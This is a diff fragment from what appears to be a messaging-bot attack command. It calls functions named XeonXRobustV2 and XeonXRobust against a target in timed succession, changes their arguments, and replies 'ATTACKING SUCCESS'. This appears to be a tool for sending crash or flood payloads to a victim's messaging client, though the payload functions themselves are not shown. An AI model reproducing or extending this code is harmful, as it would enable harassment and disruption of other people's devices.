@@ -2927,9 +2927,9 @@ await XeonXRobustV2(viper, target, (cct = true), (Ptcp = true));
 await sleep(1000);
 await XeonXRobustV2(viper, target)
 await sleep(1000);
-await XeonXRobust(viper, target);
+await XeonXRobust(target, (Ptcp = true));
 await sleep(1000);
-await XeonXRobust(viper, target);
+await XeonXRobust(target, (Ptcp = true));
 darkphonk = fs.readFileSync('./database/suki.mp3')
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
